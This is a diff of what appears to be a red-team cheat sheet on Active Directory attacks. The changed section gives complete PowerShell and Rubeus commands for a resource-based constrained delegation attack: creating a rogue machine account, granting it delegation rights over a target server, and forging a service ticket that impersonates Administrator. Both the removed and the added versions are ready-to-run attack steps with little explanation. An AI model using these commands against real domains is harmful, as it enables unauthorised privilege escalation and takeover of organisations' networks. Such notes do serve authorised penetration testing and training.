@@ -54,17 +54,17 @@ steal_token 3420
 ls \\fs-1.cyberbotic.io\c$
 ```
 ### Resource-based Constrained Delegation
+service administrators/owners can configure which domain accounts are allowed to delegate to them.
 ```
-Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
+Import-Module .\Powermad.psd1
 
-import-module powermad
+New-MachineAccount -Domain insomnia.io -DomainController 192.168.100.1 -MachineAccount Evil_genius -Password (ConvertTo-SecureString 'Password!@#' -AsPlainText -Force) -Verbose
 
-New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
-Get-DomainComputer FAKECOMPUTER #Check if created if you have powerview
+Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.psd1
 
-.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER /domain:domain.local
+Set-ADComputer ops-sqlsrvone -PrincipalsAllowedToDelegateToAccount Evil_genius$ -Verbose
 
-rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
-
+Rubeus.exe s4u /user:Evil_genius$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/opssqlsrvone /impersonateuser:Administrator /ptt
 ```
 
